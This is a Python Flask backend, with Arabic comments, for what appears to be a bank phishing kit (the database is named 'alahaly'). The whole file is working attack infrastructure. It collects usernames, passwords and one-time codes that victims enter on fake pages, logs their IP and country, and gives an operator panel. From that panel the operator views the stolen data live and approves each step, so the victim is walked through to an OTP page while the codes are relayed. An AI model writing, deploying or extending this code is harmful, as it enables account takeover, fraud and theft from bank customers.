from flask import Flask, request, jsonify, render_template, session, redirect, url_for, make_response
import os
import json
import datetime
import uuid
import time
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import Enum

app = Flask(__name__, template_folder="templates", static_folder="static")
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "super_secret_key_for_admin_panel")

# Railway/Persistent environment: use a persistent path for SQLite or DATABASE_URL if provided
db_url = os.environ.get("DATABASE_URL")
if db_url:
    # Handle Railway's PostgreSQL URL if needed (SQLAlchemy requires postgresql://)
    if db_url.startswith("postgres://"):
        db_url = db_url.replace("postgres://", "postgresql://", 1)
    app.config["SQLALCHEMY_DATABASE_URI"] = db_url
else:
    # Default to local SQLite for Railway volumes or local dev
    app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///alahaly.db"
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
db = SQLAlchemy(app)

# ============ نماذج قاعدة البيانات ============

class UserSession(db.Model):
    __tablename__ = "users"
    id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    session_id = db.Column(db.String(255), unique=True, nullable=False)
    ip_address = db.Column(db.String(45))
    country = db.Column(db.String(255))
    current_page = db.Column(db.String(255))
    last_activity = db.Column(db.DateTime, default=datetime.datetime.now)
    redirect_to = db.Column(db.String(255), nullable=True)

    requests = db.relationship("ClientRequest", backref="user_session", lazy=True, cascade="all, delete-orphan")

    def __repr__(self):
        return f"<UserSession {self.session_id}>"


class ClientRequest(db.Model):
    __tablename__ = "client_requests"
    id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    user_id = db.Column(db.String(36), db.ForeignKey("users.id"), nullable=False)
    type = db.Column(db.String(50), nullable=False)  # username, password, otp, login, personal_info
    data = db.Column(db.JSON, nullable=False)
    status = db.Column(Enum("pending", "approved", "rejected", name="request_status"), default="pending")
    timestamp = db.Column(db.DateTime, default=datetime.datetime.now)
    admin_action_time = db.Column(db.DateTime)

    def __repr__(self):
        return f"<ClientRequest {self.id} - {self.type} - {self.status}>"


# ============ دوال مساعدة ============

def get_user_session_id():
    sid = request.cookies.get('user_session_id')
    if not sid:
        sid = str(uuid.uuid4())
    return sid


def get_or_create_user(current_page=""):
    sid = get_user_session_id()
    user = UserSession.query.filter_by(session_id=sid).first()
    if not user:
        user = UserSession(session_id=sid, ip_address=request.remote_addr, current_page=current_page)
        db.session.add(user)
        db.session.commit()
    return user, sid


def get_country_from_ip(ip_address):
    try:
        import urllib.request
        api_url = f"http://ip-api.com/json/{ip_address}?fields=country"
        req = urllib.request.Request(api_url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=3) as response:
            result = json.loads(response.read().decode())
            return result.get('country', 'غير معروف')
    except Exception:
        return 'غير معروف'


# ============ مسارات التطبيق ============

@app.route("/")
def index():
    return render_template("index.html")


@app.route("/<path:filename>")
def serve_static(filename):
    if filename.endswith((".log", ".py", ".db")):
        return "Access Denied", 403
    if filename.endswith(".html"):
        template_path = os.path.join(app.template_folder, filename)
        if os.path.isfile(template_path):
            return render_template(filename)
    return app.send_static_file(filename)


# ---- Admin Login ----
@app.route("/admin/login", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST":
        password = request.form.get("password")
        if password == os.environ.get("ADMIN_PASSWORD", "Ha09876@@"):
            session["logged_in"] = True
            return redirect(url_for("admin_panel"))
        else:
            return render_template("admin_login.html", error="كلمة المرور غير صحيحة")
    return render_template("admin_login.html")


@app.route("/admin/logout")
def admin_logout():
    session.pop("logged_in", None)
    return redirect(url_for("admin_login"))


@app.route("/admin")
def admin_panel():
    if not session.get("logged_in"):
        return redirect(url_for("admin_login"))
    return render_template("admin.html")


# ---- API: كل الجلسات مع كل البيانات مجمعة ----
@app.route("/admin/all_requests")
def get_all_requests():
    if not session.get("logged_in"):
        return jsonify({"status": "error", "message": "غير مصرح لك بالوصول"}), 401

    all_sessions = UserSession.query.all()
    sessions_list = []

    for user in all_sessions:
        user_data = {}
        has_data = False
        for r in user.requests:
            has_data = True
            if r.data and isinstance(r.data, dict):
                user_data.update(r.data)

        if not has_data:
            continue

        sessions_list.append({
            "id": user.id,
            "session_id": user.session_id,
            "ip_address": user.ip_address,
            "country": user.country or "غير معروف",
            "current_page": user.current_page,
            "last_activity": user.last_activity.isoformat() if user.last_activity else None,
            "data": user_data,
            "username_status": next((r.status for r in sorted(user.requests, key=lambda x: x.timestamp, reverse=True) if r.type == 'username'), None),
            "password_status": next((r.status for r in sorted(user.requests, key=lambda x: x.timestamp, reverse=True) if r.type == 'password'), None),
            "login_status": next((r.status for r in sorted(user.requests, key=lambda x: x.timestamp, reverse=True) if r.type in ('login', 'username', 'password')), None),
            "otp_status": next((r.status for r in sorted(user.requests, key=lambda x: x.timestamp, reverse=True) if r.type == 'otp'), None),
        })

    sessions_list.sort(key=lambda x: x.get('last_activity', '') or '', reverse=True)
    return jsonify(sessions_list)


# ---- API: تفاصيل جلسة واحدة ----
@app.route("/admin/request_details/<session_id>")
def get_request_details(session_id):
    if not session.get("logged_in"):
        return jsonify({"status": "error", "message": "غير مصرح لك بالوصول"}), 401

    user = UserSession.query.filter_by(session_id=session_id).first()
    if not user:
        return jsonify({"status": "error", "message": "المستخدم غير موجود"}), 404

    user_data = {}
    for r in user.requests:
        if r.data and isinstance(r.data, dict):
            user_data.update(r.data)

    return jsonify({
        "id": user.id,
        "session_id": user.session_id,
        "ip_address": user.ip_address,
        "country": user.country or "غير معروف",
        "current_page": user.current_page,
        "data": user_data,
        "username_status": next((r.status for r in user.requests if r.type == 'username'), None),
        "password_status": next((r.status for r in user.requests if r.type == 'password'), None),
        "login_status": next((r.status for r in user.requests if r.type in ('login', 'username', 'password')), None),
        "otp_status": next((r.status for r in user.requests if r.type == 'otp'), None),
    })


# ---- Admin Approve/Reject Username / Login ----
@app.route("/admin/approve_login/<user_session_id>")
def admin_approve_login(user_session_id):
    if not session.get("logged_in"):
        return jsonify({"status": "error", "message": "غير مصرح لك بالوصول"}), 401
    user = UserSession.query.filter_by(session_id=user_session_id).first()
    if not user:
        return jsonify({"status": "error", "message": "المستخدم غير موجود"}), 404
    latest_req = None
    for r in user.requests:
        if r.type in ('username', 'login', 'password') and r.status == 'pending':
            if latest_req is None or r.timestamp > latest_req.timestamp:
                latest_req = r
    if latest_req:
        latest_req.status = "approved"
        latest_req.admin_action_time = datetime.datetime.now()
        # التوجيه الصحيح لكل خطوة
        if latest_req.type == 'username':
            user.redirect_to = "password.html"
        elif latest_req.type in ('login', 'password'):
            user.redirect_to = "otp.html"
    db.session.commit()
    return jsonify({"status": "success", "message": "تمت الموافقة بنجاح"})


@app.route("/admin/reject_login/<user_session_id>")
def admin_reject_login(user_session_id):
    if not session.get("logged_in"):
        return jsonify({"status": "error", "message": "غير مصرح لك بالوصول"}), 401
    user = UserSession.query.filter_by(session_id=user_session_id).first()
    if not user:
        return jsonify({"status": "error", "message": "المستخدم غير موجود"}), 404
    latest_req = None
    for r in user.requests:
        if r.type in ('username', 'login', 'password') and r.status == 'pending':
            if latest_req is None or r.timestamp > latest_req.timestamp:
                latest_req = r
    if latest_req:
        latest_req.status = "rejected"
        latest_req.admin_action_time = datetime.datetime.now()
    db.session.commit()
    return jsonify({"status": "success", "message": "تم الرفض"})


# ---- Admin Approve/Reject OTP ----
@app.route("/admin/approve_otp/<user_session_id>")
def admin_approve_otp(user_session_id):
    if not session.get("logged_in"):
        return jsonify({"status": "error", "message": "غير مصرح لك بالوصول"}), 401
    user = UserSession.query.filter_by(session_id=user_session_id).first()
    if not user:
        return jsonify({"status": "error", "message": "المستخدم غير موجود"}), 404
    latest_otp = None
    for r in user.requests:
        if r.type == 'otp' and r.status == 'pending':
            if latest_otp is None or r.timestamp > latest_otp.timestamp:
                latest_otp = r
    if latest_otp:
        latest_otp.status = "approved"
        latest_otp.admin_action_time = datetime.datetime.now()
        user.redirect_to = "success.html"
    db.session.commit()
    return jsonify({"status": "success", "message": "تمت الموافقة على OTP"})


@app.route("/admin/reject_otp/<user_session_id>")
def admin_reject_otp(user_session_id):
    if not session.get("logged_in"):
        return jsonify({"status": "error", "message": "غير مصرح لك بالوصول"}), 401
    user = UserSession.query.filter_by(session_id=user_session_id).first()
    if not user:
        return jsonify({"status": "error", "message": "المستخدم غير موجود"}), 404
    latest_otp = None
    for r in user.requests:
        if r.type == 'otp' and r.status == 'pending':
            if latest_otp is None or r.timestamp > latest_otp.timestamp:
                latest_otp = r
    if latest_otp:
        latest_otp.status = "rejected"
        latest_otp.admin_action_time = datetime.datetime.now()
    db.session.commit()
    return jsonify({"status": "success", "message": "تم رفض OTP"})


# ---- Submit Request ----
@app.route("/submit_request", methods=["POST"])
def submit_request():
    if request.is_json:
        data = request.get_json()
        request_type = data.get("type")
        user_data = data.get("data")

        if not request_type or not user_data:
            return jsonify({"status": "error", "message": "بيانات الطلب غير مكتملة"}), 400

        user, sid = get_or_create_user(current_page=request_type)
        user.current_page = request_type
        user.last_activity = datetime.datetime.now()
        user.redirect_to = None # إعادة تعيين التوجيه عند إرسال طلب جديد للانتظار
        if not user.country:
            user.country = get_country_from_ip(user.ip_address)
        db.session.commit()

        auto_approve = request_type in ("personal_info", "watch_request")
        initial_status = "approved" if auto_approve else "pending"

        # إذا كانت كلمة المرور، نقوم بدمج بياناتها مع نفس السجل للمستخدم لتظهر مع اسم المستخدم في لوحة الأدمن
        new_req = ClientRequest(
            user_id=user.id,
            type=request_type,
            data=user_data,
            status=initial_status,
            timestamp=datetime.datetime.now(),
            admin_action_time=datetime.datetime.now() if auto_approve else None
        )
        db.session.add(new_req)
        db.session.commit()

        resp_status = "approved" if auto_approve else "pending"
        resp_msg = "تم استلام البيانات" if auto_approve else "تم استلام طلبك، بانتظار موافقة المسؤول"
        response = make_response(jsonify({"status": resp_status, "request_id": new_req.id, "message": resp_msg}), 200 if auto_approve else 202)
        response.set_cookie('user_session_id', sid, max_age=86400*30)
        return response
    else:
        return jsonify({"status": "error", "message": "يجب أن يكون الطلب بصيغة JSON"}), 400


# ---- Request Status (for loading page polling) ----
@app.route("/request_status/<request_id>", methods=["GET", "POST"])
def get_request_status(request_id):
    req = ClientRequest.query.get(request_id)
    if req:
        user = UserSession.query.get(req.user_id)
        return jsonify({"status": req.status, "type": req.type, "data": req.data, "redirect_to": user.redirect_to if user else None})
    return jsonify({"status": "error", "message": "الطلب غير موجود"}), 404


# ---- Track Visit ----
@app.route("/track_visit", methods=["POST"])
def track_visit():
    if request.is_json:
        data = request.get_json()
        page = data.get("page")
        if not page:
            return jsonify({"status": "error", "message": "الصفحة غير محددة"}), 400

        user, sid = get_or_create_user(current_page=page)
        user.current_page = page
        user.last_activity = datetime.datetime.now()
        if not user.country:
            user.country = get_country_from_ip(user.ip_address)
        db.session.commit()

        response = make_response(jsonify({"status": "success", "message": "تم تحديث الزيارة"}))
        response.set_cookie('user_session_id', sid, max_age=86400*30)
        return response
    return jsonify({"status": "error", "message": "يجب أن يكون الطلب بصيغة JSON"}), 400


# ---- Active Visits ----
@app.route("/admin/active_visits")
def get_active_visits():
    if not session.get("logged_in"):
        return jsonify({"status": "error", "message": "غير مصرح لك بالوصول"}), 401

    five_minutes_ago = datetime.datetime.now() - datetime.timedelta(minutes=5)
    active_users = UserSession.query.filter(UserSession.last_activity >= five_minutes_ago).all()

    visits_list = []
    for user in active_users:
        visits_list.append({
            "session_id": user.session_id,
            "ip_address": user.ip_address,
            "country": user.country,
            "current_page": user.current_page,
            "last_activity": user.last_activity.isoformat()
        })
    return jsonify(visits_list)


# ---- Redirect User ----
@app.route("/admin/redirect_user/<user_session_id>", methods=["POST"])
def admin_redirect_user(user_session_id):
    if not session.get("logged_in"):
        return jsonify({"status": "error", "message": "غير مصرح لك بالوصول"}), 401

    if request.is_json:
        data = request.get_json()
        target_page = data.get("target_page")
        if not target_page:
            return jsonify({"status": "error", "message": "الصفحة المستهدفة غير محددة"}), 400

        user = UserSession.query.filter_by(session_id=user_session_id).first()
        if user:
            user.redirect_to = target_page
            db.session.commit()
            return jsonify({"status": "success", "message": "تم تعيين إعادة التوجيه للمستخدم"})
        return jsonify({"status": "error", "message": "المستخدم غير موجود"}), 404
    return jsonify({"status": "error", "message": "يجب أن يكون الطلب بصيغة JSON"}), 400


# ============ تهيئة قاعدة البيانات ============
with app.app_context():
    try:
        db.create_all()
    except Exception as e:
        print(f"db init warning: {e}")


if __name__ == "__main__":
    debug_mode = os.environ.get("FLASK_DEBUG", "0").lower() in ("1", "true", "yes")
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=debug_mode)
